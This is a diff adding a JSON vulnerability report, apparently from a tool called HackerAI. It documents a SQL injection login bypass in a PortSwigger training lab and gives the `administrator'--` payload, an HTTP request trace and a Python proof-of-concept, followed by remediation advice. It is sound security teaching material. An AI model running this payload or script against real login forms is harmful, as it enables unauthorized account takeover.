@@ -1,0 +1,134 @@
+{
+  "title": "SQL Injection in Login Function Allows Authentication Bypass as Administrator",
+  "subtitle": "https://0a5300f0035ecc1180b03524008a000b.web-security-academy.net/login",
+  "badge": { "label": "CRITICAL  9.1", "tone": "critical" },
+  "footer": "HackerAI finding report — 3501d7f8-ba2e-4f18-9c60-93e7329b2d63",
+  "summary": [
+    [
+      "What",
+      "The login form builds its SQL query by concatenating the username, so the payload `administrator'--` comments out the password check."
+    ],
+    [
+      "Impact",
+      "Anyone can sign in as `administrator` without a password and gain full control of that account."
+    ],
+    [
+      "Fix",
+      "Use parameterized queries for every SQL statement that handles user input."
+    ]
+  ],
+  "meta": [
+    ["Endpoint", "POST /login"],
+    ["CWE", "CWE-89 (SQL Injection)"],
+    ["CVSS 3.1", "9.1 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"],
+    ["Confidence", "High — exploited with a working payload"],
+    ["Fix effort", "Low"],
+    ["Reported", "2026-10-28 06:11 UTC"]
+  ],
+  "sections": [
+    {
+      "heading": "Description",
+      "blocks": [
+        {
+          "p": "The login function of the PortSwigger Web Security Academy lab inserts the submitted username directly into a SQL query, without parameterization or sanitization. An attacker can end the string literal and start a SQL comment, which removes the password condition from the query."
+        },
+        {
+          "p": "The backend most likely builds the query like this (inferred from the observed behavior, not from source code):"
+        },
+        {
+          "code": "SELECT * FROM users WHERE username = 'USER_INPUT' AND password = 'PASS_INPUT'"
+        },
+        {
+          "p": "With the username set to `administrator'--`, everything after `--` is ignored, including the password check:"
+        },
+        {
+          "code": "SELECT * FROM users WHERE username = 'administrator'--' AND password = 'PASS_INPUT'"
+        }
+      ]
+    },
+    {
+      "heading": "Reproduction steps",
+      "blocks": [
+        {
+          "ol": [
+            "Open the lab login page: `https://0a5300f0035ecc1180b03524008a000b.web-security-academy.net/login`.",
+            "Enter `administrator'--` as the username.",
+            "Enter any value as the password, for example `anything`.",
+            "Click **Log in**.",
+            "The server redirects to **My account** and the lab shows “Congratulations, you solved the lab!”."
+          ]
+        }
+      ]
+    },
+    {
+      "heading": "Evidence",
+      "blocks": [
+        {
+          "code": "POST /login HTTP/1.1\nHost: 0a5300f0035ecc1180b03524008a000b.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 45\n\nusername=administrator%27--&password=anything\n\nHTTP/1.1 302 Found\nLocation: /my-account\nSet-Cookie: session=...; HttpOnly; Secure",
+          "caption": "Request and response, trimmed to the relevant lines. The session cookie value is redacted."
+        },
+        {
+          "p": "Following the redirect returns **200 OK** for `/my-account` and the page contains “Congratulations, you solved the lab!”, which confirms an authenticated administrator session."
+        }
+      ]
+    },
+    {
+      "heading": "Proof of concept",
+      "blocks": [
+        {
+          "code": "import requests\n\nBASE_URL = \"https://0a5300f0035ecc1180b03524008a000b.web-security-academy.net\"\nLOGIN_URL = f\"{BASE_URL}/login\"\n\nsession = requests.Session()\npayload = {\"username\": \"administrator'--\", \"password\": \"anything\"}\n\nresp = session.post(LOGIN_URL, data=payload, allow_redirects=True)\nprint(f\"POST /login: {resp.status_code}  final URL: {resp.url}\")\n\nif \"Congratulations, you solved the lab!\" in resp.text:\n    print(\"SUCCESS: authentication bypass achieved\")\nelse:\n    print(\"FAILED: check response\")"
+        }
+      ]
+    },
+    {
+      "heading": "Impact",
+      "blocks": [
+        {
+          "p": "An attacker who knows the username `administrator` can log in without the password. This grants every privilege of that role: access to sensitive data, user management and system configuration."
+        },
+        {
+          "p": "**Demonstrated:** authenticated administrator session in the lab. **Not tested:** the same flaw in other endpoints (registration, password reset, search) and data extraction beyond login."
+        }
+      ]
+    },
+    {
+      "heading": "Remediation",
+      "blocks": [
+        {
+          "ol": [
+            "**Parameterized queries:** replace string concatenation with prepared statements, e.g. `SELECT * FROM users WHERE username = %s AND password = %s` with bound parameters.",
+            "**Input validation:** allow only expected username characters and a sensible length.",
+            "**Least-privilege database account:** grant only SELECT/INSERT/UPDATE on the required tables, no DROP/ALTER/GRANT.",
+            "**WAF (secondary layer):** useful as defense in depth, not a substitute for secure queries.",
+            "**Automated testing:** add SQL injection scanning (Burp Scanner, sqlmap) to the CI/CD pipeline."
+          ]
+        }
+      ]
+    },
+    {
+      "heading": "Assumptions and limits",
+      "blocks": [
+        {
+          "ul": [
+            "The lab is an authorized target under PortSwigger Web Security Academy terms.",
+            "The database accepts `--` comments (MySQL, PostgreSQL, SQLite and others do).",
+            "The username `administrator` exists, as the lab description states.",
+            "Controls: a plain `administrator` username fails to log in, so injection is required; a wrong username with the payload fails, so the specific username is required.",
+            "A screenshot (`/home/user/lab-solved-screenshot.png`) is referenced but could not be verified because no sandbox was connected."
+          ]
+        }
+      ]
+    },
+    {
+      "heading": "What would change the severity",
+      "blocks": [
+        {
+          "ul": [
+            "**Lower** if the administrator account has minimal privileges. Not verified in this lab.",
+            "**Higher** if the same flaw exists in other endpoints and enables data extraction. Not tested."
+          ]
+        }
+      ]
+    }
+  ]
+}
